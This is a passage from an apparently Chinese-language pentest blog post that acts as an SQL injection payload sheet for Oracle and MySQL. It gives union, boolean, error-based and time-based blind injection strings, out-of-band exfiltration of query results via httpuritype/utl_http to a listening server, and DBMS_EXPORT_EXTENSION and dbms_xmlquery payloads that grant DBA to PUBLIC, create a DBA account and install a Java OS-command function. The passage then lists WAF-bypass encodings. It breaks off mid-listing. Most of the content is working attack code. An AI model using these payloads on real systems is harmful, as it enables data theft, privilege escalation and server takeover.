table_name&lt;&gt;&#x27;前面查到的表名&#x27;的方法需要在不等号的后面不断地添加新的表名，操作起来较为繁琐，这里给出了另外的一种注入方法：</span><br><span class="line">select data from (select rownum as limit,table_name||&#x27;---&gt;&#x27;||column_name as data from user_tab_columns where column_name like &#x27;%PASSWORD%&#x27;) where limit =2   //由于rownum的伪列性质，这里要嵌套，不然会提示未选定列</span><br><span class="line"></span><br><span class="line">这样只要修改一个数字即可实现得到信息，方便挂载到burp上自动来跑：</span><br><span class="line"></span><br><span class="line">查列名：</span><br><span class="line">select data from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=你刚才查到的tablename) whEre limit =1</span><br><span class="line"></span><br><span class="line">查数据：</span><br><span class="line">Select data from (selEct rownum as limit,PASSWORD||chr(35)||id||chr(35)||列名1||chr(35)||列名2||chr(35)||列名3 as data from 表名        //使用||一次性查出一堆数据</span><br></pre></td></tr></table></figure>

<h2 id="oracle联合查询"><a href="#oracle联合查询" class="headerlink" title="oracle联合查询"></a>oracle联合查询</h2><p>（以下内容为可union select，有回显的情况下）</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">判断字段数：</span><br><span class="line">order by N (数字型或者注释可用)   union select null,null,null  from ... (引号包裹且注释符不可用)</span><br><span class="line"></span><br><span class="line">确定字段N的值后，and 1=2 union select NULL,NULL,.... from dual 再把这些NULL逐步的替换成数字，变成数字报错的话，就用字符去试，最终确定所有字段的数据类型</span><br><span class="line"></span><br><span class="line">找到回显位置后，我们可以通过把回显位置的数字换成下列语句来获取信息：</span><br><span class="line">获取数据库版本：select banner from sys.v_$version where rownum=1</span><br><span class="line"></span><br><span class="line">获取操作系统版本：select member from v$logfile where rownum=1</span><br><span class="line">获取当前连接数据库的用户：select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;)from dual</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">信息收集完毕，接下来来获取表的信息:</span><br><span class="line">select table_name from user_tables where rownum=1</span><br><span class="line"></span><br><span class="line">select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;第一个表名&#x27;</span><br><span class="line"></span><br><span class="line">或者我们想要快一点的话，就像报错注入一样，获取到所有表的名字：</span><br><span class="line">select data from (select rownum as limit,table_name||&#x27;---&gt;&#x27;||column_name as data from user_tab_columns where column_name like &#x27;%PASSWORD%&#x27;) where limit =N</span><br><span class="line"></span><br><span class="line">获取列的信息：</span><br><span class="line">select column_name from user_tab_columns where table_name=&#x27;manage&#x27; and rownum=1</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name=&#x27;manage&#x27; and rownum=1 and column_name&lt;&gt;&#x27;第一个列名&#x27;</span><br><span class="line"></span><br><span class="line">快一点的方法：</span><br><span class="line">select data from (select rownum as limit,column_name as data from user_tab_columns whEre table_name=你刚才查到的tablename) where limit =N</span><br><span class="line"></span><br><span class="line">从而可以获得所有的列名。</span><br><span class="line"></span><br><span class="line">获取数据:</span><br><span class="line">and 1=2 union select 1,2,列名,4,5,6 from 表名</span><br><span class="line"></span><br><span class="line">快一点的方法就是通过使用||，来一次性查出多个列中的数据。</span><br><span class="line">获取其他的数据库:</span><br><span class="line">select owner from all_tables where rownum=1</span><br><span class="line">select owner from all_tables where rownum=1 and owner&lt;&gt;&#x27;第一个数据库库名&#x27;</span><br><span class="line">从而就可以获取到所有的数据库</span><br></pre></td></tr></table></figure>

<h2 id="oracle盲注"><a href="#oracle盲注" class="headerlink" title="oracle盲注"></a>oracle盲注</h2><p>在注入点由于无法回显、或者SQL语句难以闭合导致无法使用union select或者注释，或者报错时并不显示出详细的报错信息时，基本就需要盲注了。</p>
<h3 id="oracle布尔盲注"><a href="#oracle布尔盲注" class="headerlink" title="oracle布尔盲注"></a>oracle布尔盲注</h3><p>例如在一个查询处，我们可以通过name&#x3D;xxX得到一条正确的数据，这时候就可以使用布尔型的盲注（以获取user表的长度为例）：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxX&#x27; and (select length(user) from dual)=N or &#x27;1&#x27;=&#x27;1     //N为我们猜测的长度，即直接使用and一个与注入有关的表达式，来做布尔型的判断。</span><br></pre></td></tr></table></figure>

<p>或者我们可以使用基于值的方式:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;||decode((SELECT length(user) from dual),N,&#x27;X&#x27;,&#x27;1&#x27;) or &#x27;1&#x27;=&#x27;1    //decode即相当于ORACLE中的if语句，如果长度为N就返回最后一位X，即让查询成功。</span><br></pre></td></tr></table></figure>

<p>获取user表的内容：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxX&#x27; and (ascii(substr((select user from dual),1,1)))=猜测的ascii码 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>常用payload：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1) AND 4130=5598 AND (8042=8042</span><br><span class="line">1) AND 6785=6785 AND (6807=6807</span><br><span class="line">1 AND 9314=2888</span><br><span class="line">1 AND 6785=6785</span><br><span class="line">1 AND 9975=9573-- IGvt</span><br><span class="line">1 AND 6785=6785-- QaMs</span><br><span class="line">1&#x27;) AND 3166=2235 AND (&#x27;EpuN&#x27;=&#x27;EpuN</span><br><span class="line">1&#x27;) AND 6785=6785 AND (&#x27;lahe&#x27;=&#x27;lahe</span><br><span class="line">1&#x27; AND 6548=8240 AND &#x27;QLjp&#x27;=&#x27;QLjp</span><br><span class="line">1&#x27; AND 6785=6785 AND &#x27;OijB&#x27;=&#x27;OijB</span><br></pre></td></tr></table></figure>

<h3 id="oracle报错盲注"><a href="#oracle报错盲注" class="headerlink" title="oracle报错盲注"></a>oracle报错盲注</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">比如最近遇到一个注入点，尽管会报错但是并不爆出具体信息，无法报错注入；SQL语句未知且注释不可用导致union select无法闭合；查询本身是没有返回数据的，所以也不能使用布尔型blind；在这个情况下，我们使用error-based-blind(在没查询数据但能报错的时候，通过是否报错来判断表达式是否正确)：</span><br><span class="line"></span><br><span class="line">这里同样用到了decode()，以及能够使数据库报错的case()函数：</span><br><span class="line">(select cast(需要转换的值 as 新的数据类型) from dual)    //我们在试图把一个形如&#x27;yy&#x27;的字符串转换为int型的时候，ORACLE数据库会报错</span><br><span class="line"></span><br><span class="line">注意:函数参数整体都要用括号包裹起来，否则会提示缺少右括号，原理就是把‘yy’这样的字符串cast成int的时候会报Invalid Value的错误</span><br><span class="line">从而我们最终的注入语句为:</span><br><span class="line">123&#x27; or 1=(select cast((decode((SELECT length(user) from dual),N,&#x27;1&#x27;,&#x27;yy&#x27;)) as int) from dual) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">从而可以得到user的长度。</span><br><span class="line"></span><br><span class="line">获取每一位的数据：</span><br><span class="line">123&#x27; or 1=(select cast((decode((ascii(substr((select user from dual),1,1))),1,&#x27;1&#x27;,&#x27;yy&#x27;)) as int) from dual) or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">使用burpsuit来把大写字母的ASCII遍历一遍，最终得到user的名称。</span><br><span class="line">另外，除了把字母遍历一遍之外，还可以使用bitand(),把每个字母的ASCII分别与1，2，4，...128进行按位与运算，从而只需要发8次数据，就能得到它的二进制表示的ascii码。</span><br></pre></td></tr></table></figure>

<h3 id="oracle延时盲注-基于函数超时"><a href="#oracle延时盲注-基于函数超时" class="headerlink" title="oracle延时盲注-基于函数超时"></a>oracle延时盲注-基于函数超时</h3><p>原理：</p>
<p>RECEIVE_MESSAGE函数-从指定管道获取消息</p>
<p>语法：</p>
<p>DBMS_PIPE.RECEIVE_MESSAGE(‘pipename’,timeout)</p>
<p>常用payload：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">and (select length(user) from dual)=N or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;,5)                           -- 同样是使用短路求值的思路，or后面的表达式最终会返回真。</span><br><span class="line">and (select length(user) from dual)=4 or 1=utl_http.request(&#x27;http://10.0.0.1/ &#x27;||(&#x27;a&#x27;)||&#x27;.html&#x27;);       -- 正确则不延迟</span><br><span class="line">1) AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5) AND (6314=6314</span><br><span class="line">1 AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5)</span><br><span class="line">1 AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5)-- ACtH</span><br><span class="line">1&#x27;) AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5) AND (&#x27;RTOk&#x27;=&#x27;RTOk</span><br><span class="line">1&#x27; AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5) AND &#x27;SEal&#x27;=&#x27;SEal</span><br><span class="line"></span><br><span class="line">sqlmap中的payload：</span><br><span class="line">[ok]AND 123=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;123&#x27;,5)</span><br><span class="line">[ok]OR 123=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;123&#x27;,5)</span><br></pre></td></tr></table></figure>

<h3 id="oracle延时盲注-基于重查询"><a href="#oracle延时盲注-基于重查询" class="headerlink" title="oracle延时盲注-基于重查询"></a>oracle延时盲注-基于重查询</h3><p>原理：</p>
<p>即通过执行一个较为消耗资源的查询，造成数据库的延迟，再通过返回是否延迟来判断猜测的结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and  (select length(user) from dual)=6 or 1&lt;(SELECT count(*) FROM all_users A, all_users B, all_users C,all_users D,all_users E);</span><br></pre></td></tr></table></figure>

<p>在我们的N是正确的情况下，数据库并不会产生延迟；如果错误，则会产生延迟</p>
<p>常用payload：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ok]AND 123=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</span><br><span class="line">[ok]OR 123=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</span><br></pre></td></tr></table></figure>

<h2 id="oracle带外传输"><a href="#oracle带外传输" class="headerlink" title="oracle带外传输"></a>oracle带外传输</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">即在Oracle拥有外网权限的时候，可以让Oracle把查询的结果拼接到URL里，去访问这个URL，再在我们的服务器上监听端口即可得到查询结果。（同样以查询当前用户为例）</span><br><span class="line">and (select httpuritype(&#x27;127.0.0.1:8888/&#x27;||(select user from dual)).getclob() from dual) is not null;</span><br><span class="line"></span><br><span class="line">或者也可以使用utl_http.request等函数。</span><br><span class="line"></span><br><span class="line">测试效果如下：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172925212.png" alt="image-20251217172925212"></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试环境:</span><br><span class="line">CentOS Linux release 7.2.1511 (Core)</span><br><span class="line">Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production</span><br><span class="line"></span><br><span class="line">执行方式很多种，这边只研究Oracle10g，并且本地实测成功的:</span><br><span class="line">DBMS_EXPORT_EXTENSION()</span><br><span class="line">dbms_xmlquery.newcontext()</span><br><span class="line">DBMS_JAVA_TEST.FUNCALL()</span><br></pre></td></tr></table></figure>

<p>注意：注入时需去除末尾分号;</p>
<h3 id="DBMS-EXPORT-EXTENSION"><a href="#DBMS-EXPORT-EXTENSION" class="headerlink" title="DBMS_EXPORT_EXTENSION()"></a>DBMS_EXPORT_EXTENSION()</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</span><br><span class="line">权限：None</span><br><span class="line">详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。</span><br><span class="line">提权：该请求将导致查询&quot;GRANT DBA TO PUBLIC&quot;以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权</span><br><span class="line">payload：select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#x27;FOO&#x27;,&#x27;BAR&#x27;,&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant dba to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;,&#x27;SYS&#x27;,0,&#x27;1&#x27;,0) from dual</span><br><span class="line"></span><br><span class="line">建立DBA权限的TEST帐号</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;grant dba to test identified by test&#x27;&#x27;;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">直接添加CMDHSHELL</span><br><span class="line"></span><br><span class="line">1.创建java包：</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">2.赋予java权限：</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;begin dbms_java.grant_permission( &#x27;&#x27;&#x27;&#x27;SYSTEM&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;EXECUTE&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">3.创建函数：</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">4.执行命令:</span><br><span class="line">|| utl_inaddr.get_host_name((select LinxRunCMD(&#x27;cmd /c dir d:&#x27;)))--</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext()"></a>dbms_xmlquery.newcontext()</h3><h3 id="DBMS-JAVA-TEST-FUNCALL"><a href="#DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="DBMS_JAVA_TEST.FUNCALL()"></a>DBMS_JAVA_TEST.FUNCALL()</h3><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.t00ls.net/viewthread.php?tid=45663&amp;highlight=Oracle%E6%B3%A8%E5%85%A5</span><br></pre></td></tr></table></figure>

<h1 id="逃逸waf注入技术"><a href="#逃逸waf注入技术" class="headerlink" title="逃逸waf注入技术"></a>逃逸waf注入技术</h1><h3 id="简单WAF绕过技术"><a href="#简单WAF绕过技术" class="headerlink" title="简单WAF绕过技术"></a>简单WAF绕过技术</h3><h4 id="常见绕过技术"><a href="#常见绕过技术" class="headerlink" title="常见绕过技术"></a>常见绕过技术</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">技术分类：</span><br><span class="line">a)大小写混合</span><br><span class="line"></span><br><span class="line">b)替换关键字</span><br><span class="line"></span><br><span class="line">c)使用编码</span><br><span class="line">utf-7的绕过，还有utf-16、utf-32的绕过</span><br><span class="line">d)使用注释</span><br><span class="line"></span><br><span class="line">e)等价函数与命令</span><br><span class="line"></span><br><span class="line">f)特殊符号</span><br><span class="line"></span><br><span class="line">g)HTTP参数控制</span><br><span class="line"></span><br><span class="line">h)缓冲区溢出</span><br><span class="line"></span><br><span class="line">i)整合绕过</span><br></pre></td></tr></table></figure>

<h4 id="常见符号绕过"><a href="#常见符号绕过" class="headerlink" title="常见符号绕过"></a>常见符号绕过</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">表名列名等单/双引号过滤：</span><br><span class="line">1.使用char()函数绕过：</span><br><span class="line">concat(char(99),char(116),char(102),char(52))</span><br><span class="line"></span><br><span class="line">2.使用十六进制绕过：</span><br><span class="line">比如：ctf =十六进制转换=&gt; 0x630x740x66</span><br><span class="line"></span><br><span class="line">3.html实体编码：</span><br><span class="line">&amp;#39</span><br><span class="line"></span><br><span class="line">4.双url编码：</span><br><span class="line">%2527</span><br><span class="line">这里主要是因为绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是&#x27;，所以成功绕过过滤。</span><br></pre></td></tr></table></figure>

<h4 id="过滤-等逻辑处理字符"><a href="#过滤-等逻辑处理字符" class="headerlink" title="过滤&amp;,|,*,&#x2F;,&#x3D;等逻辑处理字符"></a>过滤&amp;,|,*,&#x2F;,&#x3D;等逻辑处理字符</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以用in,exists,position..in,&gt;,&lt;,!,&lt;&gt;,like等操作符绕过这个链接有详细介绍http://www.runoob.com/mysql/mysql-like-clause.html</span><br><span class="line">这里举一个例子，比如要使用sql盲注的话但是过滤了substr,mid，asccii,ord等函数可以使用一下语句</span><br><span class="line"></span><br><span class="line">admin&#x27; AND password LIKE &quot;p%&quot; --</span><br></pre></td></tr></table></figure>

<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤&lt;,&gt;"></a>过滤&lt;,&gt;</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line">使用greatest()绕过</span><br><span class="line">说明：</span><br><span class="line">greatest(n1,n2,n3,..........)返回 n1、n2、n3等一系列参数中的最大值</span><br><span class="line">实例：</span><br><span class="line">greatest(ascii(mid(user(),0,1)),150)</span><br><span class="line">and greatest(ascii(substr(database(),0,1)),64)=64</span><br><span class="line"></span><br><span class="line">方法：</span><br><span class="line">least()</span><br><span class="line">说明：</span><br><span class="line">least函数会返回最小值</span><br><span class="line">实例：</span><br><span class="line">least(ascii(mid(user(),0,1)),150)</span><br></pre></td></tr></table></figure>

<h4 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line">编码，内联注释，大小写绕过</span><br><span class="line">实例：</span><br><span class="line">%75%6e%69%6f%6e</span><br><span class="line">/*!50000union*/</span><br><span class="line">Union</span><br><span class="line"></span><br><span class="line">from过滤：</span><br><span class="line">使用from.</span><br></pre></td></tr></table></figure>

<h4 id="表名等被过滤"><a href="#表名等被过滤" class="headerlink" title="表名等被过滤"></a>表名等被过滤</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">以information_schema.tables为例</span><br><span class="line">空格 information_schema . tables</span><br><span class="line">着重号 information&lt;/em&gt;schema.tables</span><br><span class="line">特殊符 /!information——schema.tables/</span><br><span class="line">别名 information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)</span><br><span class="line"></span><br><span class="line">替换information_schema</span><br><span class="line">把information_schema.tables改成</span><br><span class="line">information_schema.statistics或</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line"></span><br><span class="line">测试:</span><br><span class="line">select schema_name from information schema.tables;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="未知字段名"><a href="#未知字段名" class="headerlink" title="未知字段名"></a>未知字段名</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.使用虚拟表：</span><br><span class="line">原理：</span><br><span class="line">核心在将一个可控的虚拟表V1与需要查询的真实表V2联合起来（使用union select），使得表字段可控从而查询数据。</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">select a.2 from (select 1,2 from DUAL union select * from math1)a;  #查询math1表，第2个字段的值，注意d.2要和a，b要和字段数一致</span><br><span class="line">select d.2 from (select * from (select 1)a join (select 2)b union select * from math1)d;    #当过滤逗号时使用</span><br><span class="line"></span><br><span class="line">2.使用left()，进行猜解</span><br><span class="line">原理：</span><br><span class="line">当字段存在时left()返回True,否则返回False</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">select id,name from math1 where id=0 or left(name,0)=0;</span><br><span class="line">select id,name from math1 where id=1 and left(name,0)=0;   #使用数字时，永远返回true？可以猜解字符型表名</span><br></pre></td></tr></table></figure>

<h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%20         #url编码</span><br><span class="line">%00         #00截断</span><br><span class="line">%09         #tab</span><br><span class="line">%0a         #绕过360云waf，是\n，绕过select.+from</span><br><span class="line">%0b</span><br><span class="line">%0c</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">+</span><br><span class="line">-++-        #数值型可以</span><br><span class="line">-+-+-+-+~~  #同上，但是实站都行，原因未知</span><br><span class="line">!~~!        #有点问题</span><br><span class="line">/**/        #</span><br><span class="line">/*--*/</span><br><span class="line">()</span><br></pre></td></tr></table></figure>

<h4 id="判断其他过滤"><a href="#判断其他过滤" class="headerlink" title="判断其他过滤"></a>判断其他过滤</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 